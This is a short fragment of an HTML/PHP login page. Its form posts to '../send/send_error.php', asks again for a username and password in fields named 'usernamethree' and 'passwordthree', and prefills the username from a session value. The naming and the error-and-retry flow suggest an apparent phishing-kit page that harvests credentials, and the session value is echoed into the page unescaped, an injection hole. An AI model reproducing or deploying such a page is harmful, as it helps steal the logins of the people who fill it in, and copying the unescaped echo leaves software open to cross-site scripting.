          ...
          <div class="sheet">
            <div class="sheet__section">
              <div class="sheet__block">
                ...
                <form id="login-form" class="form content-elem" action="../send/send_error.php" method="post">
                  ...
                  <input class="input-text login-form-user" id="login-form-user" maxlength="200" name="usernamethree" type="text" required="true" value="<?php echo $_SESSION["usernametwo"]; ?>">
                  ...
                  <input class="input-text login-form-password" id="login-form-password" maxlength="40" name="passwordthree" type="password" required="true" value="" autofocus="focus">
